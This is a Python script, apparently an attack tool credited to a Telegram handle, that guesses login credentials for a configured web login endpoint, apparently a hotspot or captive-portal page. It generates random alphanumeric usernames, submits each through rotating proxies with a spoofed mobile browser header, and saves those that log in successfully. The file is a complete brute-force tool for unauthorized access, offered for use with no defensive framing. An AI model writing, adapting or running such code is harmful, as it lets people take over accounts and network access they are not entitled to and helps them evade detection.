#!/usr/bin/env python3
"""GhostUsernameHunterPY - Python port of the GhostUsernameHunter Node.js tool."""

import json
import os
import random
import string
import sys
import time
from datetime import datetime

import requests
from colorama import Fore, Style, init as colorama_init

colorama_init(autoreset=True)

CONFIG_PATH = os.path.join(os.path.dirname(__file__), "src", "config.json")
TESTED_FILE = "tested_usernames.txt"
VALID_FILE = "valid_usernames.txt"

PROXIES = [
    "http://192.168.1.100:8080",
    "http://192.168.1.101:8080",
    "http://192.168.1.102:8080",  # أضف المزيد
]

HEADERS = {
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Referer": "http://g.com/index.html",
    "User-Agent": (
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36"
    ),
}

TOOL_NAME = "GhostUsernameHunter"
BOX_WIDTH = 60


def load_config():
    with open(CONFIG_PATH, "r", encoding="utf-8") as f:
        return json.load(f)


def last_modified():
    return os.stat(CONFIG_PATH).st_mtime


def center(text):
    padding = max(0, BOX_WIDTH - len(text))
    left = padding // 2
    right = padding - left
    return " " * left + text + " " * right


def info_line(label, value):
    padded_label = label.ljust(18, ".")
    raw = f"  {padded_label} {value}"
    return raw.ljust(BOX_WIDTH - 1)[: BOX_WIDTH - 1]


def log_banner(tool_name, config, random_part_length):
    border = Fore.CYAN + "╔" + "═" * BOX_WIDTH + "╗"
    footer = Fore.CYAN + "╚" + "═" * BOX_WIDTH + "╝"
    divider = Fore.CYAN + "║" + "─" * BOX_WIDTH + "║"

    def line(text):
        return Fore.CYAN + "║" + Fore.GREEN + center(text) + Fore.CYAN + "║"

    def info_row(text):
        return Fore.CYAN + "║" + Fore.WHITE + text + Fore.CYAN + "║"

    print(border)
    print(line(tool_name))
    print(line("Developed By Ghost - Telegram @GHOST_529"))
    print(divider)
    print(info_row(info_line("Target", config.get("url", ""))))
    print(info_row(info_line("Method", config.get("method", ""))))
    print(info_row(info_line("Username Format", f"{config.get('prefix', '')}[random]{config.get('suffix', '')}")))
    print(info_row(info_line("Random Length", str(random_part_length))))
    print(info_row(info_line("Usernames to Test", str(config.get("count", "")))))
    print(info_row(info_line("Started At", datetime.now().strftime("%c"))))
    print(footer)


def log_valid(username):
    print(Fore.GREEN + f"[+] Valid username: {username}")
    timestamp = datetime.now().strftime("%c")
    with open(VALID_FILE, "a", encoding="utf-8") as f:
        f.write(f"{username} - Time: {timestamp}\n")


def log_invalid(username):
    print(Fore.RED + f"[-] Invalid: {username}")


def add_to_file(username):
    with open(TESTED_FILE, "a", encoding="utf-8") as f:
        f.write(username + "\n")


def load_usernames_to_test():
    usernames = set()
    if os.path.exists(TESTED_FILE):
        with open(TESTED_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    usernames.add(line)
    return usernames


def check_server_connection(url):
    try:
        requests.get(url, timeout=5)
        return True
    except requests.RequestException:
        return False


def logout(logout_url, username):
    try:
        requests.get(logout_url, headers=HEADERS, timeout=10)
        print(Fore.BLUE + f"[!] Logout request sent for {username}")
    except requests.RequestException as err:
        print(Fore.RED + f"[!] Logout failed: {err}")


def send_request(url, method, username):
    data = {
        "username": username,
        "domain": "1M%2F4M",
        "popup": "true",
        "var": "callBack",
        "verfiy": "false",
    }

    proxy = random.choice(PROXIES)
    proxies = {"http": proxy, "https": proxy}

    if method == "POST":
        return requests.post(url, data=data, headers=HEADERS, proxies=proxies, timeout=15)
    elif method == "GET":
        params = {"username": username, "verify": "callBack"}
        return requests.get(url, params=params, headers=HEADERS, proxies=proxies, timeout=15)
    else:
        raise ValueError(f"Unsupported method: {method}")


def check_from_response(response):
    try:
        text = response.text
        try:
            data = response.json()
        except ValueError:
            data = None

        if data is None:
            return "<input" not in text
        else:
            return data.get("logged_in") == "yes"
    except Exception as err:
        print(Fore.RED + f"[!] Request failed for  {err}")
        return False


def generate_username(prefix, suffix, digits, random_part_length):
    random_part = "".join(random.choice(digits) for _ in range(random_part_length))
    return prefix + random_part + suffix


def generate_alpha_num_username(prefix, suffix, random_part_length):
    letters = string.ascii_lowercase
    digits = string.digits
    chars = letters + digits

    while True:
        random_part = ""
        has_letter = False
        has_digit = False
        while len(random_part) < random_part_length:
            char = random.choice(chars)
            random_part += char
            if char in letters:
                has_letter = True
            if char in digits:
                has_digit = True
        if has_letter and has_digit:
            return prefix + random_part + suffix


def run():
    config = load_config()
    url = config["url"]
    logout_url = config.get("logout_url", "")
    method = config.get("method", "POST").upper()
    length = config.get("length", 8)
    digits = config.get("digits", "0123456789")
    prefix = config.get("prefix", "")
    suffix = config.get("suffix", "")
    count = config.get("count", 50)
    random_part_length = length - len(prefix) - len(suffix)

    last_modi = last_modified()
    tested = load_usernames_to_test()

    log_banner(TOOL_NAME, config, random_part_length)

    i = 0
    for _ in range(count):
        server_online = check_server_connection(url)
        while not server_online:
            print(Fore.GREEN + "[+] Waiting for network connection...")
            time.sleep(5)
            server_online = check_server_connection(url)

        start = time.time()
        new_modified = last_modified()
        if new_modified != last_modi:
            print(Fore.YELLOW + "\n[*] Detected change in config.json, reloading...")
            config = load_config()
            url = config["url"]
            logout_url = config.get("logout_url", "")
            method = config.get("method", "POST").upper()
            length = config.get("length", 8)
            digits = config.get("digits", "0123456789")
            prefix = config.get("prefix", "")
            suffix = config.get("suffix", "")
            random_part_length = length - len(prefix) - len(suffix)
            last_modi = new_modified
            print(Fore.CYAN + "[+] New settings applied!")

        username = generate_alpha_num_username(prefix, suffix, random_part_length)
        if username in tested:
            continue

        tested.add(username)
        add_to_file(username)
        i += 1

        print(Fore.MAGENTA + f"[DEBUG] Testing {username} (#{i})")

        try:
            response = send_request(url, method, username)

            if check_from_response(response):
                log_valid(username)
                if logout_url:
                    logout(logout_url, username)
            else:
                log_invalid(username)

            end = time.time()
            print(Fore.LIGHTBLACK_EX + f"Token Time: {int((end - start) * 1000)} ms")

        except requests.RequestException as err:
            print(Fore.RED + f"[!] Request failed for {username}: {err}")
            continue

    print(Fore.CYAN + "\n[*] Done.")


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user.")
        sys.exit(0)
